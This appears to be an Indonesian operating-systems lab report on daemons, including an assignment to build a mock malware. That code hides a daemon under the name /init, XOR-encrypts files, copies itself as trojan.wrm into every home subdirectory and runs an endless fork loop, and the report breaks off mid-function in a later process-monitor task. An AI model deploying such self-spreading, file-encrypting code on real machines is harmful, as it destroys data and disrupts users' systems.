Membuat fungsi untuk men-decode kata/kalimat dalam nama file yang berupa base64.

```
int is_daemon_running() {
    FILE *fp = fopen(PID_FILE, "r");
    if (!fp) return 0;

    pid_t pid;
    if (fscanf(fp, "%d", &pid) != 1) {
        fclose(fp);
        return 0;
    }
    fclose(fp);

    if (kill(pid, 0) == 0) {
        return 1;
    } else {
        return 0;
    }
}
```
Membuat fungsi untuk mengecek apakah daemon sudah jalan atau belum.

```
int folder_exists(const char *path) {
    struct stat st;
    return stat(path, &st) == 0 && S_ISDIR(st.st_mode);
}
```
Membuat fungsi untuk mengecek apakah folder sudah ada atau belum.

```
void decrypt_daemon() {
    if (is_daemon_running()) {
        printf("୨♡୧ ... Daemon udah jalan.\n");
        exit(0);
    }    
    pid_t pid = fork();
    if (pid < 0) {
        printf("Dekripsi gagal.");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        printf("୨♡୧ ... Dekripsi  Daemon berhasil dengan PID %d.\n", pid);
        exit(EXIT_SUCCESS);
    }

    setsid();
    chdir(".");
    umask(0);

    if (!folder_exists(".daemon")) {
        mkdir(".daemon", 0755);
    }

    FILE *fp = fopen(PID_FILE, "w");
    if (fp) {
        fprintf(fp, "%d", getpid());
        fclose(fp);
    }

    char msg[100];
    snprintf(msg, sizeof(msg), "Successfully started decryption process with PID %d.", getpid());
    log_activity(msg);

    while (1) {
        DIR *d = opendir(STARTER_KIT_DIR);
        if (!d) {
            sleep(3);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(d))) {
            if (entry->d_type == DT_REG) {
                char path[512];
                snprintf(path, sizeof(path), "%s/%s", STARTER_KIT_DIR, entry->d_name);

                if (!is_base64_encoded(entry->d_name)) continue;

                char *decoded_name = base64_decode(entry->d_name);
                char new_path[512];
                snprintf(new_path, sizeof(new_path), "%s/%s", STARTER_KIT_DIR, decoded_name);

                if (access(new_path, F_OK) == 0) {
                    free(decoded_name);
                    continue;
                }
                if (rename(path, new_path) == 0)
                free(decoded_name);
            }
        }
        closedir(d);
        sleep(5);
    }
}
```
Membuat fungsi untuk menjalankan daemon dan mendecode nama file yang berupa base64.

#### C. Membuat fitur memindahkan file
```
int is_dir_empty(const char *path) {
    struct dirent *entry;
    DIR *dir = opendir(path);
    if (!dir) return 1;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            closedir(dir);
            return 0;
        }
    }

    closedir(dir);
    return 1;
}
```
Membuat fitur untuk mengecek apakah direktori kosong atau ada isi.

```
void move_files(const char *src, const char *dst, const char *log_template) {
    if (is_dir_empty(src)) {
        printf("Folder %s kosong. Tidak ada file yang dipindahkan.\n", src);
        return;
    }
    DIR *d = opendir(src);
    if (!d) return;
    struct dirent *entry;
    while ((entry = readdir(d))) {
        if (entry->d_type == DT_REG) {
            char src_path[512], dst_path[512];
            snprintf(src_path, sizeof(src_path), "%s/%s", src, entry->d_name);
            snprintf(dst_path, sizeof(dst_path), "%s/%s", dst, entry->d_name);
            if (rename(src_path, dst_path) == 0) {
                char msg[512];
                snprintf(msg, sizeof(msg), log_template, entry->d_name);
                log_activity(msg);
            }
        }
    }
    closedir(d);
}
```
Membuat fitur untuk memindahkan file dari direktori `starter_kit` ke `quarantine` maupun sebaliknya sesuai panggilan argumen.

#### D. Membuat fungsi untuk menghapus isi file dalam direktori quarantine
```
void eradicate_quarantine() {
    if (is_dir_empty("quarantine")) {
        printf("/ ❦ . . { ERROR } Tidak ada file di quarantine. Tidak ada yang dihapus.\n");
        return;
    }

    DIR *d = opendir(QUARANTINE_DIR);
    if (!d) return;
    struct dirent *entry;
    while ((entry = readdir(d))) {
        if (entry->d_type == DT_REG) {
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", QUARANTINE_DIR, entry->d_name);
            if (remove(path) == 0) {
                char msg[512];
                snprintf(msg, sizeof(msg), "%s - Successfully deleted.", entry->d_name);
                log_activity(msg);
            }
        }
    }
    closedir(d);
    remove(".daemon/.downloaded");
    printf("୨♡୧ ... Berhasil hapus semua file di quarantine.\n");
}
```
Membuat fungsi yang akan berjalan menghapus direktori `quarantine` dan menghapus jejak download berupa `.daemon/.downloaded` jika direktori quarantine ada isinya.

#### E. Membuat fungsi untuk membunuh daemon yang sudah berjalan.
```
void shutdown_decrypt_daemon() {
    FILE *fp = fopen(PID_FILE, "r");
    if (!fp) {
        printf("/ ❦ . . { ERROR } Daemon tidak ditemukan. Emang ada dekripsi daemon yang jalan?\n");
        return;
    }

    pid_t pid;
    if (fscanf(fp, "%d", &pid) != 1) {
        printf("/ ❦ . . { ERROR } Gagal membaca PID dari file.\n");
        fclose(fp);
        return;
    }
    fclose(fp);

    if (kill(pid, SIGTERM) == 0) {
        printf("୨♡୧ ... Berhasil membunuh daemon dengan PID %d.\n", pid);
        char msg[128];
        snprintf(msg, sizeof(msg), "Successfully shut off decryption process with PID %d.\n", pid);
        log_activity(msg);
        remove(PID_FILE);
    } else {
        perror("/ ❦ . . { ERROR } Gagal membunuh daemon.");
    }
}
```
Membuat fungsi untuk membunuh daemon yang telah aktif dari fungsi `decrypt`.

#### INT MAIN
```
int main(int argc, char *argv[]) {
    mkdir(STARTER_KIT_DIR, 0777);
    mkdir(QUARANTINE_DIR, 0777);

    if (argc < 2) {
        printf("୨♡୧ ... Contoh: ./starterkit --[decrypt|quarantine|return|eradicate|shutdown]\n");
        return 1;
    }

    if (strcmp(argv[1], "--return") == 0) {
        return_mode = 1;
        move_files(QUARANTINE_DIR, STARTER_KIT_DIR, "%s - Successfully returned to starter kit directory.");
        printf("୨♡୧ ... Berhasil balikin semua file ke starter_kit.\n");
    } else if (strcmp(argv[1], "--quarantine") == 0) {
        move_files(STARTER_KIT_DIR, QUARANTINE_DIR, "%s - Successfully moved to quarantine directory.");
        printf("୨♡୧ ... Berhasil mindahin semua file ke quarantine.\n");
    } else if (strcmp(argv[1], "--eradicate") == 0) {
        eradicate_quarantine();
    } else if (strcmp(argv[1], "--decrypt") == 0) {
        download_kit();
        decrypt_daemon();
    } else if (strcmp(argv[1], "--shutdown") == 0) {
        shutdown_decrypt_daemon();
    } else {
        printf("/ ❦ . . { ERROR } Argumen tidak dikenal: %s.\n", argv[1]);
        printf("୨♡୧ ... Contoh: ./starterkit --[decrypt|quarantine|return|eradicate|shutdown].\n");
        return 1;
    }

    return 0;
}
```
Membuat fungsi utama yaitu `int main` untuk menjalankan program sesuai dengan format argumen dari user.

#### F. Menambahkan error handling.
```
if (pid == 0) {
        execvp(args[0], args);
        perror("/ ❦ . . { ERROR } Proses execvp gagal.");
        exit(EXIT_FAILURE);
```
```
} else {
        perror("/ ❦ . . { ERROR } Proses fork gagal.");
        exit(EXIT_FAILURE);
```
```
if (pid < 0) {
        printf("Dekripsi gagal.");
        exit(EXIT_FAILURE);
```
```
 if (is_dir_empty("quarantine")) {
        printf("/ ❦ . . { ERROR } Tidak ada file di quarantine. Tidak ada yang dihapus.\n");
        return;
```
```
if (!fp) {
        printf("/ ❦ . . { ERROR } Daemon tidak ditemukan. Emang ada dekripsi daemon yang jalan?\n");
        return;
    }
```
```
 if (fscanf(fp, "%d", &pid) != 1) {
        printf("/ ❦ . . { ERROR } Gagal membaca PID dari file.\n");
        fclose(fp);
        return;
```
```
} else {
        perror("/ ❦ . . { ERROR } Gagal membunuh daemon.");
    }
```
```
} else {
        printf("/ ❦ . . { ERROR } Argumen tidak dikenal: %s.\n", argv[1]);
        printf("୨♡୧ ... Contoh: ./starterkit --[decrypt|quarantine|return|eradicate|shutdown].\n");
        return 1;
```

#### G. Mencatat dan menyimpan rekam jejak aktivitas user/pengguna.
```
void log_activity(const char *msg) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char buf[100];
    strftime(buf, sizeof(buf), "[%d-%m-%Y][%H:%M:%S]", t);

    fprintf(fp, "%s - %s\n", buf, msg);
    fclose(fp);
}
```
Membuat fungsi `log_activity` yang akan membuat `activity.log` untuk merekam aktivitas pengguna sesuai format. Selain itu, juga memanggil fungsi tersebut pada fungsi lain jika ingin mencatat proses dari fungsi lain yang memanggil.

### > Revisi
```
int main(int argc, char *argv[]) {
...
    download_kit();
...
```
Menambahkan `download_kit()` di awal `int main` agar jika program dijalankan maka otomatis men-download.

```
void decrypt_daemon() {
...
DIR *d = opendir(QUARANTINE_DIR);
...
snprintf(path, sizeof(path), "%s/%s", QUARANTINE_DIR, entry->d_name);
...
snprintf(new_path, sizeof(new_path), "%s/%s", QUARANTINE_DIR, decoded_name);
```
Mengubah tujuan membuka direktori dan path pada fungsi `decrypt_daemon()` agar fungsi decrypt berjalan di direktori `quarantine`.

#### Dokumentasi setelah revisi
![Screenshot (381)](https://github.com/user-attachments/assets/983a311e-3e19-4ad1-af5b-f85c594762aa)
![Screenshot (382)](https://github.com/user-attachments/assets/51730142-cd83-4fc9-80bd-5e0f064fcc22)
![Screenshot (383)](https://github.com/user-attachments/assets/c3cd899c-6353-4348-8dfc-47a7d413fecf)
![Screenshot (384)](https://github.com/user-attachments/assets/6bb17ad4-ace0-4149-ae89-4ea27f208a8e)
![Screenshot (385)](https://github.com/user-attachments/assets/a91266fb-e2c5-471a-9fea-12b69038869f)
![Screenshot (386)](https://github.com/user-attachments/assets/a09fe86f-6582-48da-92de-566bc369481f)
![Screenshot (387)](https://github.com/user-attachments/assets/32bf7bf8-9c42-486a-ba0a-cbda66ece2c5)
![Screenshot (388)](https://github.com/user-attachments/assets/1ee9df31-d8b6-40a8-bc37-a5ea6033df8e)
![Screenshot (389)](https://github.com/user-attachments/assets/588cf2d7-03cd-4100-8a46-9e85fc581a04)
![Screenshot (390)](https://github.com/user-attachments/assets/5fd1de23-1e1b-49ba-a271-e6f421696dfb)
![Screenshot (391)](https://github.com/user-attachments/assets/fd2d150b-e1f2-4631-aecb-b0828bc89b17)


## SOAL 3
Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di PT Mafia Security Cabang Ngawi yang hanya keluar di malam pengerjaan soal shift modul 2. Konon katanya anomali ini akan mendatangi praktikan sisop yang tidak mengerjakan soal ini. Ihh takutnyeee. Share ke teman teman kalian yang tidak mengerjakan soal ini.

A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init. 

B. Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor pada folder dapat bekerja dengan dua cara, mengenkripsi seluruh isi folder secara rekursif, atau mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Jika menggunakan metode rekursif, semua file di dalam folder harus terenkripsi , dari isi folder paling dalam sampai ke current directory, dan tidak mengubah struktur folder Jika menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program. Pembagian metode sebagai berikut: Untuk kelompok ganjil menggunakan metode rekursif, dan kelompok genap menggunakan metode zip.

C. Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.

D. Anak fitur pertama dan kedua terus berjalan secara berulang ulang selama malware masih hidup dengan interval 30 detik.

E. Anak fitur ketiga ini sangat unik. Dinamakan rodok.exe, proses ini akan membuat sebuah fork bomb di dalam perangkat korban.

F. Konon katanya malware ini dibuat oleh Andriana karena dia sedang memerlukan THR. Karenanya, Andriana menambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0) dan tiap fork akan melakukan cryptomining. Cryptomining disini adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char. Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik. Sesuaikan jumlah maksimal mine-crafter dengan spesifikasi perangkat, minimal 3 (Jangan dipaksakan sampai lag, secukupnya saja untuk demonstrasi)

G. Lalu mine-crafter-XX dan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log dengan format: 
[YYYY-MM-DD hh:mm:ss][Miner XX] hash
Dimana XX adalah ID mine-crafter yang membuat hash tersebut. 

H. Karena mine-crafter-XX adalah anak dari rodok.exe, saat rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati. 

Nama anak anak diatas adalah nama proses yang akan berjalan. Mengganti nama proses berarti saat dilakukan pemeriksaan proses berjalan (seperti ps aux dan lainnya), maka proses tersebut akan muncul dengan nama yang ditentukan.

```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>

// --- BAGIAN A --- Daemon yang menyembunyikan diri dan mengganti nama menjadi /init
void create_daemon() {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);  
    if (pid > 0) exit(EXIT_SUCCESS); 
    
    umask(0);  
    
    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);  
    
    if ((chdir("/")) < 0) exit(EXIT_FAILURE);  

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);
}

// --- BAGIAN B --- Enkripsi dengan metode XOR
void xor_encrypt(const char *filename, unsigned char key) {
    FILE *file = fopen(filename, "rb+");
    if (!file) {
        perror("Gagal membuka file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *buffer = (char *)malloc(filesize);
    if (!buffer) {
        perror("Alokasi memori gagal");
        fclose(file);
        return;
    }

    fread(buffer, 1, filesize, file);
    fseek(file, 0, SEEK_SET);

    for (long i = 0; i < filesize; ++i) {
        buffer[i] ^= key;
    }

    fwrite(buffer, 1, filesize, file);
    fclose(file);
    free(buffer);
}


// --- BAGIAN C --- 
// Fungsi untuk menyalin malware ke direktori target
void trojan(const char *direktoriTarget, const char *lokasiMalware) {
    DIR *dir = opendir(direktoriTarget);
    if (!dir) return;

    struct dirent *entri;
    char path[1024];

    // Iterasi setiap file/direktori di direktori target
    while ((entri = readdir(dir)) != NULL) {
        if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            trojan(path, lokasiMalware);  
        }
    }

    // Menyalin malware ke dalam direktori yang ditemukan
    char pathTujuan[1024];
    snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);

    FILE *src = fopen(lokasiMalware, "rb");
    FILE *dst = fopen(pathTujuan, "wb");
    if (src && dst) {
        char buf[4096];
        size_t jumlah;
        while ((jumlah = fread(buf, 1, sizeof(buf), src)) > 0) {
            fwrite(buf, 1, jumlah, dst);
        }
    }
    if (src) fclose(src);
    if (dst) fclose(dst);

    closedir(dir);
}

// Fungsi untuk membuat ZIP dari folder
void zip_folder(const char *folder_name, const char *zip_filename) {
    pid_t pid = fork();
    if (pid == 0) {
        char *args[] = {"/usr/bin/zip", "-r", (char *)zip_filename, (char *)folder_name, NULL};
        execv(args[0], args);
        perror("Gagal membuat ZIP");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        wait(NULL);
    } else {
        perror("Fork gagal");
        exit(EXIT_FAILURE);
    }
}

void change_permissions(const char *path) {
    char command[256];
    snprintf(command, sizeof(command), "chmod -R 777 %s", path);
    int ret = system(command);
    if (ret == 0) {
        printf("Hak akses folder '%s' diubah menjadi 777.\n", path);
    } else {
        perror("Gagal mengubah hak akses");
    }
}

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <string.h>
#include <sys/prctl.h>
#include <semaphore.h>

#define MAX_MINERS 5
#define HASH_LEN 64

int active_miners = 0;
sem_t miner_semaphore;

// === D: Feature 1 and 2 Loop ===
void feature_loop() {
    while (1) {
        printf("Running feature 1 and 2...\n");
        sleep(30); // Interval of 30 seconds
    }
}

// === F: Cryptominer Function ===
void *cryptominer(void *arg) {
    char hash[HASH_LEN + 1];
    int id = *(int *)arg;
    free(arg);

    char name[20];
    sprintf(name, "mine-crafter-%d", id);
    prctl(PR_SET_NAME, name, 0, 0, 0);

    while (1) {
        // Generate random hash
        for (int i = 0; i < HASH_LEN; i++) {
            sprintf(&hash[i], "%x", rand() % 16);
        }
        hash[HASH_LEN] = '\0';

        printf("[%s] Generated hash: %s\n", name, hash);

        // Sleep for a random time between 3-30 seconds
        int sleep_time = (rand() % 28) + 3;
        sleep(sleep_time);
    }
    return NULL;
}

// === E: Fork Bomb Function ===
void fork_bomb() {
    while (1) {
        pid_t pid = fork();
        if (pid == 0) {
            int *id = malloc(sizeof(int));
            if (id == NULL) exit(1);
            *id = __sync_add_and_fetch(&active_miners, 1);

            if (*id <= MAX_MINERS) {
                sem_wait(&miner_semaphore);
                cryptominer(id);
                sem_post(&miner_semaphore);
            } else {
                free(id);
                exit(0); // Exit if max miners exceeded
            }
        }
    }
}


int main(int argc, char **argv) {
    const char *lokasiMalware = "/home/dinda/malware/executable";  // Path ke file malware
    const char *folderTarget = "/home/dinda";  // Folder target untuk trojan

    sem_init(&miner_semaphore, 0, MAX_MINERS);

    create_daemon();

    char lokasiProgram[1024];
    ssize_t panjang = readlink("/proc/self/exe", lokasiProgram, sizeof(lokasiProgram) - 1);
    if (panjang != -1) {
        lokasiProgram[panjang] = '\0';
        trojan(folderTarget, lokasiProgram);
    } else {
        fprintf(stderr, "Gagal mendapatkan path executable.\n");
        return 1;
    }

    time_t t = time(NULL);
    unsigned char key = (unsigned char)(t % 256);
    const char *file_to_encrypt = "randomfile";
    xor_encrypt(file_to_encrypt, key);
    printf("File '%s' berhasil dienkripsi.\n", file_to_encrypt);

    const char *folder_to_zip = "test";
    const char *zip_filename = "test.zip";

    zip_folder(folder_to_zip, zip_filename);
    printf("Folder '%s' berhasil di-zip menjadi '%s'.\n", folder_to_zip, zip_filename);

    xor_encrypt(zip_filename, key);
    printf("File ZIP '%s' berhasil dienkripsi.\n", zip_filename);

    change_permissions(folder_to_zip);

    remove_directory(folder_to_zip);

    pthread_t feature_thread;
    if (pthread_create(&feature_thread, NULL, (void *)feature_loop, NULL) != 0) {
        perror("Gagal membuat thread untuk fitur loop");
        return 1;
    }

    fork_bomb();

    pthread_join(feature_thread, NULL);

    sem_destroy(&miner_semaphore);

    return 0;
}

```

### Penjelasan
### > A. menyembunyikan diri dengan mengganti namanya menjadi /init.
#### Output
![WhatsApp Image 2025-04-18 at 23 17 36_95386bd9](https://github.com/user-attachments/assets/0d3e86e2-b59b-4ce6-a7e5-5300f25142ec)


#### Fork Proses Baru
```
pid = fork();
if (pid < 0) exit(EXIT_FAILURE);
if (pid > 0) exit(EXIT_SUCCESS);
```
untuk membuat child process.
`pid < 0`: Jika gagal membuat proses baru, keluar dengan status gagal.
`pid > 0`: Proses parent keluar, sehingga hanya child process yang berjalan.

#### Set File Mode Mask
```
umask(0);
```
untuk mengatur umask ke 0 agar daemon memiliki akses penuh (tanpa pembatasan) ke file dan direktori yang dibuat.

#### Membuat Sesi Baru
```
sid = setsid();
if (sid < 0) exit(EXIT_FAILURE);
```
untuk memisahkan proses dari terminal yang memulai proses.

`setsid:`

- Membuat sesi baru.
- Menjadikan proses ini pemimpin sesi.
- Memutuskan asosiasi dengan terminal.

#### Mengganti Direktori Kerja
```
if (chdir("/") < 0) exit(EXIT_FAILURE);
```
- untuk mengganti direktori kerja ke root `(/)` untuk:

- Menghindari daemon mengunci direktori tertentu.

- Memastikan proses tidak bergantung pada direktori tertentu.

#### Menutup File Deskriptor Standar
```
close(STDIN_FILENO);
close(STDOUT_FILENO);
close(STDERR_FILENO);
```
Untuk Menutup file deskriptor untuk input, output, dan error standar. Hal ini mencegah daemon berinteraksi langsung dengan terminal pengguna.

#### Mengatur Nama Proses
```
prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);
```
- untuk mengatur nama proses daemon menjadi `"/init"`.

- `prctl(PR_SET_NAME, ...)` digunakan untuk mengganti nama proses di tabel proses.

### > B. 
Membuka File
```
FILE *file = fopen(filename, "rb+");
if (!file) {
    perror("Gagal membuka file");
    return;
}
```
- Untuk membuka file dalam mode baca dan tulis biner (rb+).
- Jika file tidak dapat dibuka, tampilkan pesan kesalahan dan keluar dari fungsi.

#### Mengukur Ukuran File
```
fseek(file, 0, SEEK_END);
long filesize = ftell(file);
fseek(file, 0, SEEK_SET);
```
Untuk Mengukur ukuran file.

`fseek(file, 0, SEEK_END)`: Memindahkan penunjuk file ke akhir file.

`ftell(file)`: Mendapatkan posisi penunjuk file (ukuran file dalam byte).

`fseek(file, 0, SEEK_SET)`: Mengembalikan penunjuk file ke awal.

#### Mengalokasikan Memori
```
char *buffer = (char *)malloc(filesize);
if (!buffer) {
    perror("Alokasi memori gagal");
    fclose(file);
    return;
}
```
- Untuk mengalokasikan buffer untuk menyimpan seluruh isi file ke dalam memori.
- Jika alokasi memori gagal, tutup file dan keluar dari fungsi.

#### Membaca Isi File ke Memori
```
fread(buffer, 1, filesize, file);
fseek(file, 0, SEEK_SET);
```
Untuk membaca isi file ke dalam buffer. Setelah membaca, kembalikan penunjuk file ke awal untuk persiapan menulis data yang telah dienkripsi.

#### Melakukan Enkripsi/Dekripsi dengan XOR
```
for (long i = 0; i < filesize; ++i) {
    buffer[i] ^= key;
}
```
- Untuk melakukan operasi XOR pada setiap byte data dengan kunci (key).
- XOR adalah operasi biner yang akan mengubah nilai byte menjadi terenkripsi.
- Jika dilakukan lagi dengan kunci yang sama, data akan kembali ke bentuk aslinya (sifat reversibilitas XOR).

#### Menulis Data yang Telah Diubah
```
fwrite(buffer, 1, filesize, file);
fclose(file);
free(buffer);
```
Untuk menulis data hasil XOR kembali ke file, menutup file, dan membebaskan memori yang digunakan.

### > C.
#### 1. Fungsi trojan
Tujuan:
Menyalin sebuah file (dalam konteks ini dianggap malware) ke setiap direktori dalam struktur folder target.

#### Membuka direktori target:
```
DIR *dir = opendir(direktoriTarget);
if (!dir) return;
```
- Membuka direktori yang diberikan (direktoriTarget).

- Jika gagal, fungsi langsung keluar.

#### Iterasi isi direktori:
```
while ((entri = readdir(dir)) != NULL) {
    if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
        continue;
}
```
Melewati entri spesial . dan .. yang menunjuk ke direktori saat ini dan induknya.

#### Membentuk path absolut:
```
snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);
```
Menggabungkan nama direktori target dengan entri saat ini untuk mendapatkan path lengkap.

#### Jika entri adalah direktori, rekursif:
```
if (S_ISDIR(st.st_mode)) {
    trojan(path, lokasiMalware);
}
```
Jika entri adalah direktori, fungsi dipanggil kembali secara rekursif untuk menyusuri isi direktori tersebut.

#### Menyalin malware ke direktori:
```
snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);
FILE *src = fopen(lokasiMalware, "rb");
FILE *dst = fopen(pathTujuan, "wb");
```
- Membuat file tujuan bernama `trojan.wrm` di direktori target.

- Menyalin isi file sumber (lokasiMalware) ke file tujuan menggunakan buffer.

#### 2. Fungsi zip_folder
Tujuan:
Membuat file ZIP dari sebuah folder menggunakan utilitas sistem (zip).

Fork proses:
```
pid_t pid = fork();
```
Membuat proses baru untuk menjalankan perintah ZIP.

Proses anak:
```
char *args[] = {"/usr/bin/zip", "-r", (char *)zip_filename, (char *)folder_name, NULL};
execv(args[0], args);
```
Proses anak memanggil zip dengan argumen:

`-r`: Rekursif, memproses semua isi folder.

`zip_filename`: Nama file ZIP yang dihasilkan.

`folder_name`: Folder yang akan diarsipkan.

Proses induk:
```
wait(NULL);
```
Menunggu proses anak selesai.

#### 3. Fungsi change_permissions
Tujuan:
Mengubah izin akses folder menjadi 777 (izin penuh untuk membaca, menulis, dan menjalankan).

Menyusun perintah sistem:
```
snprintf(command, sizeof(command), "chmod -R 777 %s", path);
```
Perintah chmod -R 777 digunakan untuk mengubah izin semua file dan subdirektori secara rekursif.

#### Menjalankan perintah:
```
int ret = system(command);
```
- Perintah dijalankan menggunakan fungsi system.
Menangani hasil:
- Jika perintah berhasil, mencetak pesan sukses.
- Jika gagal, mencetak pesan kesalahan.

### D.
```
void feature_loop() {
    while (1) {
        printf("Running feature 1 and 2...\n");
        sleep(30); // Interval of 30 seconds
    }
}
```
Fungsi ini menjalankan loop tak berujung (while (1)) yang setiap 30 detik mencetak pesan "Running feature 1 and 2..." ke terminal atau log menggunakan printf. Fungsi sleep(30) digunakan untuk menunggu selama 30 detik sebelum iterasi berikutnya dimulai.

### F.
``` 
char hash[HASH_LEN + 1];
```
Deklarasi array hash: Menyimpan hasil hash acak dengan panjang 64 karakter ditambah satu untuk karakter null-terminator \0.
```
int id = *(int *)arg;
free(arg);
```
- Mengambil ID miner: ID ini diambil dari argumen yang dilewatkan ke fungsi `(void *arg)` dan di-casting menjadi pointer ke integer.
- Membebaskan memori: `free(arg)` digunakan untuk mencegah kebocoran memori setelah ID dipakai.
```
char name[20];
sprintf(name, "mine-crafter-%d", id);
prctl(PR_SET_NAME, name, 0, 0, 0);
```
Menamai proses: Nama proses diatur menjadi `mine-crafter-XX`, di mana XX adalah nilai id. Fungsi prctl digunakan untuk mengubah nama proses di sistem.
```
while (1) {
```
Loop tanpa akhir: Fungsi berjalan terus-menerus sampai proses dihentikan.
```
for (int i = 0; i < HASH_LEN; i++) {
    sprintf(&hash[i], "%x", rand() % 16);
}
hash[HASH_LEN] = '\0';
```
Membuat hash acak: Hash dibuat karakter per karakter menggunakan angka acak (0–15, direpresentasikan dalam hexadecimal). Hasilnya adalah string hexadecimal sepanjang 64 karakter.
```
printf("[%s] Generated hash: %s\n", name, hash);
```
Mencetak hash: Setiap hash yang dihasilkan dicetak ke terminal dengan format `[mine-crafter-XX]` Generated hash: `<hash>`.
```
int sleep_time = (rand() % 28) + 3;
sleep(sleep_time);
```
Tidur dengan durasi acak: Proses berhenti sejenak selama 3 hingga 30 detik (nilai acak dihasilkan oleh (rand() % 28) + 3).
```
return NULL;
```
Akhir fungsi: Fungsi mengembalikan NULL, meskipun pada kenyataannya loop tidak akan pernah selesai secara alami.

### E.
```
void fork_bomb() {
    while (1) { 
        pid_t pid = fork(); 
        if (pid == 0) { 
            int *id = malloc(sizeof(int)); // Alokasikan memori untuk ID
            if (id == NULL) exit(1); 

            *id = __sync_add_and_fetch(&active_miners, 1); // Tambahkan miner aktif
            if (*id <= MAX_MINERS) { // Jika masih di bawah batas
                sem_wait(&miner_semaphore); 
                cryptominer(id); 
                sem_post(&miner_semaphore); 
            } else { 
                free(id); 
                exit(0); 
            }
        }
    }
}
```

- Menciptakan proses anak dengan fork() secara terus-menerus.

- Mengontrol jumlah maksimal miner menggunakan MAX_MINERS dan semaphore.

- Menghindari kebocoran sumber daya dengan keluar dari proses anak jika miner melebihi batas.

## SOAL 4
Suatu hari, Nobita menemukan sebuah alat aneh di laci mejanya. Alat ini berbentuk robot kecil dengan mata besar yang selalu berkedip-kedip. Doraemon berkata, "Ini adalah Debugmon! Robot super kepo yang bisa memantau semua aktivitas di komputer!" Namun, alat ini harus digunakan dengan hati-hati. Jika dipakai sembarangan, bisa-bisa komputer Nobita malah error total!

A. Mengetahui semua aktivitas user
Doraemon ingin melihat apa saja yang sedang dijalankan user di komputernya. Maka, dia mengetik:
./debugmon list <user>
Debugmon langsung menampilkan daftar semua proses yang sedang berjalan pada user tersebut beserta PID, command, CPU usage, dan memory usage.

B. Memasang mata-mata dalam mode daemon
Doraemon ingin agar Debugmon terus memantau user secara otomatis. Doraemon pun menjalankan program ini secara daemon dan melakukan pencatatan ke dalam file log dengan menjalankan:
./debugmon daemon <user>

C. Menghentikan pengawasan
User mulai panik karena setiap gerak-geriknya diawasi! Dia pun memohon pada Doraemon untuk menghentikannya dengan:
./debugmon stop <user>

D. Menggagalkan semua proses user yang sedang berjalan
Doraemon yang iseng ingin mengerjai user dengan mengetik:
./debugmon fail <user>
Debugmon langsung menggagalkan semua proses yang sedang berjalan dan menulis status proses ke dalam file log dengan status FAILED. Selain menggagalkan, user juga tidak bisa menjalankan proses lain dalam mode ini.

E. Mengizinkan user untuk kembali menjalankan proses
Karena kasihan, Shizuka meminta Doraemon untuk memperbaiki semuanya. Doraemon pun menjalankan:
./debugmon revert <user>
Debugmon kembali ke mode normal dan bisa menjalankan proses lain seperti biasa.

F. Mencatat ke dalam file log
Sebagai dokumentasi untuk mengetahui apa saja yang debugmon lakukan di komputer user, debugmon melakukan pencatatan dan penyimpanan ke dalam file debugmon.log untuk semua proses yang dijalankan dengan format
[dd:mm:yyyy]-[hh:mm:ss]_nama-process_STATUS(RUNNING/FAILED)
Untuk poin b, c, dan e, status proses adalah RUNNING. Sedangkan untuk poin d, status proses adalah FAILED. 


### struktur soal 
- debugmon.c


## Jawaban

### A. Mengetahui semua aktivitas user
```
void list_user_processes(const char *username) {
    DIR *proc_dir;
    struct dirent *entry;

    proc_dir = opendir("/proc");
    if (!proc_dir) {
        perror("Failed to open /proc directory");
        exit(EXIT_FAILURE);
    }

    printf("%-10s %-10s %-10s %-10s\n", "PID", "COMMAND", "CPU%", "MEM%");
    while ((entry = readdir(proc_dir)) != NULL) {
        if (!isdigit(entry->d_name[0]))
            continue;

        char stat_path[256], cmdline_path[256], status_path[256];
        FILE *stat_file, *cmdline_file, *status_file;
        char line[1024];
